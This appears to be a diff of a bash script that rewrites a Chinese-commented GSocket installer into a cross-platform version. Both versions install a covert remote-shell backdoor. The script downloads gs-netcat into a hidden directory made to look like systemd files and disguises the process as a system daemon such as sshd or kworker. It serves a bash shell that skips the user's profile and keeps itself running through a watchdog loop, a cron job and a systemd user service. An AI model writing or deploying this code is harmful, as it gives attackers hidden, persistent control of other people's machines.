@@ -1,78 +1,85 @@
-#!/usr/bin/env bash
-# GSocket 自动安装脚本 - 精简版
-# 用法: bash -c "$(curl -fsSL https://你的域名/script.sh)"
+#!/bin/bash
+# GSocket Universal Installer (Linux + FreeBSD + macOS)
 
 set -e
 
-# ============================================
-# 1. 基础配置
-# ============================================
-# 检测用户 HOME 目录
+# Detect OS
+OS=$(uname -s | tr '[:upper:]' '[:lower:]')
+ARCH=$(uname -m)
+
+# Set binary URL based on OS
+case "$OS" in
+    linux)
+        case "$ARCH" in
+            x86_64)  BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64" ;;
+            aarch64) BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-arm64" ;;
+            armv7l)  BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-armv7" ;;
+            *)       BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64" ;;
+        esac
+        ;;
+    freebsd)
+        BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_freebsd-x86_64"
+        ;;
+    darwin)
+        BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_macos-x86_64"
+        ;;
+    *)
+        echo "Unsupported OS: $OS"
+        exit 1
+        ;;
+esac
+
+# Home detection
 if [ -z "$HOME" ]; then
     HOME=$(getent passwd "$(whoami)" | cut -d: -f6)
 fi
 
-# 生成随机密钥 (40字符)
+# Generate secret
 GS_SECRET=$(openssl rand -hex 20 2>/dev/null || date +%s | sha256sum | head -c 40)
 
-# 隐藏进程名 (随机选择系统进程名)
-HIDE_NAMES=("systemd" "sshd" "kworker" "rsyslogd" "dbus-daemon" "NetworkManager" "gdm" "accounts-daemon")
-HIDE_NAME=${HIDE_NAMES[$RANDOM % ${#HIDE_NAMES[@]}]}
-
-# 安装目录 (隐藏在用户配置目录下)
+# Install dir
 INSTALL_DIR="$HOME/.config/.cache/.systemd"
 BIN_PATH="$INSTALL_DIR/gs-netcat"
 SECRET_FILE="$INSTALL_DIR/.secret"
+HIDE_NAME=$(shuf -e "systemd" "sshd" "kworker" "rsyslogd" "dbus-daemon" "NetworkManager" -n1 2>/dev/null || echo "systemd")
 
 mkdir -p "$INSTALL_DIR"
 cd "$INSTALL_DIR"
 
-# ============================================
-# 2. 下载 GSocket 二进制文件
-# ============================================
-echo "[+] 下载 GSocket..."
-
-# 检测系统架构
-ARCH=$(uname -m)
-case "$ARCH" in
-    x86_64)  BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64" ;;
-    aarch64) BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-arm64" ;;
-    armv7l)  BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-armv7" ;;
-    *)       BIN_URL="https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64" ;;
-esac
-
-# 下载 (失败则尝试 Alpine 版本)
-curl -fsSL "$BIN_URL" -o "$BIN_PATH" 2>/dev/null || {
-    curl -fsSL "https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64-alpine" -o "$BIN_PATH" 2>/dev/null
+# Download binary
+echo "[+] Downloading GSocket for $OS..."
+curl -fsSL "$BIN_URL" -o "$BIN_PATH" || {
+    echo "Download failed, trying alternative..."
+    # Fallback to static Alpine for Linux, or try other mirrors
+    if [ "$OS" = "linux" ]; then
+        curl -fsSL "https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64-alpine" -o "$BIN_PATH"
+    else
+        exit 1
+    fi
 }
 chmod +x "$BIN_PATH"
 
-# ============================================
-# 3. 保存密钥
-# ============================================
+# Save secret
 echo "$GS_SECRET" > "$SECRET_FILE"
 chmod 600 "$SECRET_FILE"
 
-# ============================================
-# 4. 启动 GSocket 守护进程
-# ============================================
-echo "[+] 启动守护进程..."
+# Start daemon with a watchdog loop (to keep it alive)
+echo "[+] Starting daemon..."
 cd "$HOME"
 
-# 后台运行，隐藏进程名，绕过 .bashrc
-nohup env GSOCKET_ARGS="-k $SECRET_FILE -liqD -e /bin/bash --noprofile --norc" \
-    exec -a "$HIDE_NAME" "$BIN_PATH" >/dev/null 2>&1 &
+# Use a while loop to restart if it dies
+nohup bash -c "
+    while true; do
+        GSOCKET_ARGS=\"-k $SECRET_FILE -liqD -e /bin/bash --noprofile --norc\"
+        exec -a \"$HIDE_NAME\" \"$BIN_PATH\"
+        sleep 5
+    done
+" >/dev/null 2>&1 &
 
-# ============================================
-# 5. 设置持久化 (Cron + Systemd)
-# ============================================
-echo "[+] 设置持久化..."
+# Persistence: cron (every minute)
+(crontab -l 2>/dev/null | grep -v "gs-netcat" || true; echo "* * * * * cd $HOME && GSOCKET_ARGS=\"-k $SECRET_FILE -liqD -e /bin/bash --noprofile --norc\" exec -a $HIDE_NAME $BIN_PATH >/dev/null 2>&1") | crontab - 2>/dev/null
 
-# 5a. Cron (每5分钟重启一次，确保永远在线)
-CRON_CMD="cd $HOME && GSOCKET_ARGS=\"-k $SECRET_FILE -liqD -e /bin/bash --noprofile --norc\" exec -a $HIDE_NAME $BIN_PATH >/dev/null 2>&1"
-(crontab -l 2>/dev/null | grep -v "gs-netcat" || true; echo "*/5 * * * * $CRON_CMD") | cront - 2>/dev/null
-
-# 5b. Systemd User Service (如果可用)
+# Systemd user (if available)
 if systemctl --user --no-pager status 2>/dev/null | grep -q "State:"; then
     SERVICE_DIR="$HOME/.config/systemd/user"
     mkdir -p "$SERVICE_DIR"
@@ -97,23 +104,5 @@ EOF
     systemctl --user restart gsocket.service 2>/dev/null
 fi
 
-# ============================================
-# 6. 输出连接信息
-# ============================================
-echo ""
-echo "=============================================="
-echo "✅ 安装完成！"
-echo "=============================================="
-echo "🔑 密钥: $GS_SECRET"
-echo ""
-echo "📌 从客户端连接:"
-echo "   gs-netcat -s \"$GS_SECRET\" -i"
-echo ""
-echo "📌 如果遇到 .bashrc 密码锁:"
-echo "   gs-netcat -s \"$GS_SECRET\" -e \"/bin/bash --noprofile --norc\""
-echo ""
-echo "📌 卸载方法:"
-echo "   crontab -l | grep -v 'gs-netcat' | crontab -"
-echo "   systemctl --user stop gsocket.service 2>/dev/null"
-echo "   rm -rf $INSTALL_DIR"
-echo "=============================================="
+# Output token
+echo "$GS_SECRET"
